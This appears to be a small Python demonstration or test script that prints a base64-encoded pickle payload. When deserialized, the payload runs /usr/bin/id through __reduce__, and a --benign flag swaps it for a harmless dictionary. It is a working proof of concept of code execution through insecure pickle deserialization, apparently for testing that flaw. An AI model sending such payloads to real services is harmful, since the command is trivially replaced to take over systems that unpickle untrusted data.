import base64
import pickle
import subprocess


class PicklePayloadBuilder:
    def __reduce__(self):
        # Docker Linux demonstration; pickle calls this during deserialization.
        return (subprocess.call, (["/usr/bin/id"],))


import sys
if "--benign" in sys.argv:
    payload = {"message": "hello-from-python", "count": 1}
else:
    payload = PicklePayloadBuilder()
print(base64.b64encode(pickle.dumps(payload)).decode("ascii"))
